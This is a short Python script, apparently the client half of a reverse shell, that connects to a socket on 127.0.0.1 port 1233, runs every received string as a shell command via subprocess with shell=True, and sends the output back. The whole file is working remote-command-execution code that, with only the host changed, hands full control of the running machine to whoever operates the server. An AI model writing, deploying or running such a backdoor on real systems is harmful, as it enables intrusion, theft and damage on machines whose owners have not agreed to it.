import socket
import threading
import subprocess

client_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

host = "127.0.0.1"
port = 1233

client_sock.connect((host, port))

print("Connected to server")

def client():
    while True:
        command = client_sock.recv(1024)

        if not command:
            break

        data = command.decode("utf-8")

        if data.lower() == "exit":
            break

        output = subprocess.run(
            data,
            shell=True,
            capture_output=True,
            text=True
        )

        result = output.stdout

        if result == "":
            result = output.stderr

        client_sock.send(result.encode("utf-8"))

    client_sock.close()

t = threading.Thread(target=client)
t.start()
t.join()
